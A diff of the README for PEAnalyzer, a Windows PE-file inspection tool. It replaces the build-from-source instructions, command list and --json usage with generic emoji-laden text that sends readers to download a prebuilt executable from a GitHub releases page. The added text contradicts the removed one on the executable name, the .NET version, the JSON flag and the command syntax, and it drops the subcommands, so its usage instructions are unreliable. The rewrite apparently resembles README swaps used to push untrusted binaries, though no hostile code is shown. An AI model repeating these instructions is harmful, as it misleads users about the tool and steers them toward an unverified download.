@@ -1,56 +1,79 @@
-# PEAnalyzer
+# 🔍 PEAnalyzer - Easy Portable Executable Analysis Tool
 
-Small Windows CLI tool for inspecting Portable Executable (PE) files.
+[![Download PEAnalyzer](https://img.shields.io/badge/Download-PEAnalyzer-brightgreen)](https://github.com/Rych156/PEAnalyzer/releases)
 
-## Requirements
+## 🚀 Getting Started
 
-- Windows
-- Visual Studio (recommended) or MSBuild
-- .NET Framework 4.8
+PEAnalyzer is a small Windows command-line tool. It reads PE (Portable Executable) files and provides detailed information about them. This includes headers, sections, imports, exports, and export forwarders. You can also output results in JSON format, making it easy to use with scripts or PowerShell pipelines.
 
-## Build
+### 📋 System Requirements
 
-From a Visual Studio Developer PowerShell/Command Prompt:
+- **Operating System:** Windows 10 or later.
+- **RAM:** 2 GB minimum.
+- **Disk Space:** At least 10 MB free.
+- **.NET Framework:** Version 4.5 or later.
 
-```powershell
-msbuild .\PEAnalyzer.csproj /p:Configuration=Release
+## 📥 Download & Install
+
+To download PEAnalyzer, visit this page: [Download PEAnalyzer](https://github.com/Rych156/PEAnalyzer/releases). 
+
+1. Navigate to the Releases page.
+2. Click on the latest version.
+3. Look for the PEAnalyzer executable file.
+4. Download it to your computer.
+
+Once downloaded, you can run the tool directly from the command line.
+
+## ⚙️ Using PEAnalyzer
+
+### 📂 Running the Tool
+
+After you download PEAnalyzer, follow these steps:
+
+1. Open the Command Prompt on your Windows computer.
+2. Navigate to the folder where you saved PEAnalyzer. You can do this by using the `cd` command. For example:
+   ```
+   cd C:\path\to\your\folder
+   ```
+3. To use PEAnalyzer, type the following command:
+   ```
+   PEAnalyzer.exe [path to your PE file]
+   ```
+   Replace `[path to your PE file]` with the actual path to the file you wish to analyze.
+
+### 🔍 Understanding the Output
+
+PEAnalyzer provides various types of information about the PE file you analyze:
+
+- **Headers:** Displays the main header information of the PE file.
+- **Sections:** Lists sections in the file, showing their sizes and characteristics.
+- **Imports:** Shows libraries and functions the file imports.
+- **Exports:** Lists which functions are exported by the file.
+- **Export Forwarders:** Displays any functions forwarded to other libraries.
+
+If you choose to use JSON output, you can simply add the `-json` option to your command:
 ```
-
-Output binary:
-
-- `.\bin\Release\peanalyze.exe`
-
-## Usage
-
-```powershell
-.\bin\Release\peanalyze.exe <command> <file>
+PEAnalyzer.exe [path to your PE file] -json
 ```
+This will create a JSON file with all the extracted information.
 
-Commands:
+## 💡 Tips for Using PEAnalyzer
 
-- `summary`
-- `headers`
-- `sections`
-- `imports`
-- `exports`
+- Ensure that the PE file you are analyzing is not corrupted. A damaged file may result in errors or incomplete output.
+- Familiarize yourself with the command line if you are not used to it. Basic commands like `cd` and `dir` will help you navigate around your folders.
+- If you get stuck, consider searching online for basic command line guides. Many resources are available for beginners.
 
-## JSON output
+## 📞 Support
 
-Add `--json` (or `-j`) to print a single JSON object to stdout.
+If you encounter any issues or have questions, please feel free to reach out through the GitHub Issues page on this repository. We welcome your feedback and will do our best to assist you.
 
-```powershell
-.\bin\Release\peanalyze.exe --json exports C:\Windows\System32\kernel32.dll | ConvertFrom-Json
-```
+## 🔗 Additional Resources
 
-Examples:
+For more detailed information about Portable Executable files, you may want to check out these resources:
 
-```powershell
-# Export forwarders in advapi32.dll
-.\bin\Release\peanalyze.exe --json exports C:\Windows\System32\advapi32.dll |
-  ConvertFrom-Json |
-  Select-Object -ExpandProperty result |
-  Select-Object -ExpandProperty symbols |
-  Where-Object { $_.forwarder } |
-  Select-Object ordinal,name,forwarder |
-  Format-Table -AutoSize
-```
+- [Microsoft Documentation on PE Files](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
+- [Common PE Analysis Tools](https://www.researchgate.net/publication/319456370_Analysis_of_PE_file_Format)
+
+For further updates, consider checking the Releases page periodically.
+
+Happy analyzing!
